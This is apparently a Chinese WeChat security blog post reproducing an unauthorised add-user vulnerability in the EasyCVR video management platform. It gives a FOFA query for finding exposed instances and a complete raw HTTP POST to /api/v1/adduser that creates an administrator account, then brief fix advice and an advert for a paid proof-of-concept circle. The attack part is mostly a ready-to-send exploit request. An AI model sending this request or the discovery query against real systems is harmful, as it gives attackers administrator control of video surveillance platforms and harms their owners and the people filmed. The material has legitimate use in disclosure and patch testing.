---
title: EasyCVR视频管理平台adduser未授权添加用户漏洞
url: https://mp.weixin.qq.com/s/EGPS-PwNvYlXjfnjAL-5oQ
source: Doonsec's feed
date: 2026-10-06
fetch_date: 2026-10-07T07:54:46.255888
---

# EasyCVR视频管理平台adduser未授权添加用户漏洞

# EasyCVR视频管理平台adduser未授权添加用户漏洞

原创

北雪网络安全
北雪网络安全

北雪网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**

01

更多内容

#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296

02

搜索引擎

FOFA：title="EasyCVR"

03

漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgDJvJ6ibuqDePaJvq6N0kMkxJhVN3iaHP2ECV8mAhqZWDtNDqjww6fUuW5nnD3V3QO26bDP7tiaqaD9G138mOicqJt83r2CHw62r0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzg9GiaHy4HLoloZZWquzafTUUaGicDgyiczhIttDxH3RCXkpd0CibHCeGqTy1TwFqFWVVyMAJxMCJrf6l2YaxnxnSRZustaPAaHT4M/640?wx_fmt=png&from=appmsg)

```
POST /api/v1/adduser HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0;Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116Safari/537.36sec-ch-ua-platform: "Windows"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8X-Requested-With: XMLHttpRequestAccept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedCookie: token=RCetmLH4R; SECKEY_ABVK=341O79W4ebXI1fwZXWjp1G8KixaJDAcDBdnf50Iva64%3D; BMAP_SECKEY=i6mxYDDH5WQdJKN_C_0Xw4ayl-QTr1QcSJry8L7F0ewxzGX9Cjo_Sr0KLsJ9zPXc8UMYdnVqTVygJYoUMgJlOQCX15jvQCgEK2mBeM2rts7_CrNwHVhE-3Xl2HgfhP8D8Ha05OupktNQUbUqdtnLk2BpDi3qw75g0O4OOML07bFSouG-DFJGQ-ZiQu8a0oNlConnection: closeAccept-Charset: utf-8 name=admin&username=admin&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgPbPq4oJ7odLS6FS0r14xXXPKh0g3QCaj0ib0UsYtj8nicSlbgvUXLlqD4nx1JUvueCLbyUt8YMicDGgD45WNcvkETiaNb7KwU27U/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaCvO1PFFzovbxKuAKBwWc1zIxFkdyTC9qrFNW4WECjPUsXGKM7azTwI024WAXGu4muZCJuI0fUDNca0TQI8OMTTYqIsC6LgvU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjMjGGF7gEAME3nibXZ4Yoyibv9HU0K1teNNpGoIYjeIDYy6xYQiaQaurOiaKOZQibKF1FvUfPjwOhV7gFYCnbaDDHy211ickFu8l6GY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjuPAm9BibzjD7ejg98ooEljRZTnibotqsUsY0JTia4icca7B3wib4PKMYiaNUumWnwHmrQL727Zx8GPHUHgInsZ4fYV2BoI4NZ8Ao9I/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjd8ofVKNQH1NeBnzianxEQ1F7phLWu7NdYfVEhUibF0icOFBYX8BcOkiay7hibkwf2MibSl0TwToRibnH2Z8DjwSt4mRr3pKiaUBqHB3k/640?wx_fmt=png&from=appmsg)

04

修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本

05

内部圈子

🛠️ 【知名漏洞实战圈，纯干货】🛠️

还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！
目前已更新poc数量2500+

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhIgKF0iaHOM9BemkyhsR8p1Ic8ib9x0FHrkQHHhG8SBZfpujP22cRBpVibmuxPQdJcZppbicspbsibicxY4KA2wUcOvWqXCAnFG6gBY/640?wx_fmt=png&from=appmsg)

🎯 适用场景

**▫️渗透测试**▫️企业漏洞自查****▫️****攻防演练****▫️****安全服务****▫️****合规运营****

****![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaK30ChpoYWAYFVviaKjR88uJ740RnOhPQtQehnz1ptkehPKBEzLHH8VBnxVN6uZ4OUPazxjJ1NiafOuYZS0co5sKMWWOLiao9Iu0/640?wx_fmt=png&from=appmsg)****

**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**

****▫️**全民掌握网安技能，共守智能时代晴空。**

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjnJSMCbXtribgZvAJkvYkoOvpBvPF0qhoF9YzA6fEqEfv9BgW7zHvsKKlzrgAFaGiaMSJk9eObsFyRqjoKl6QuVVC65jmCxZnSQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过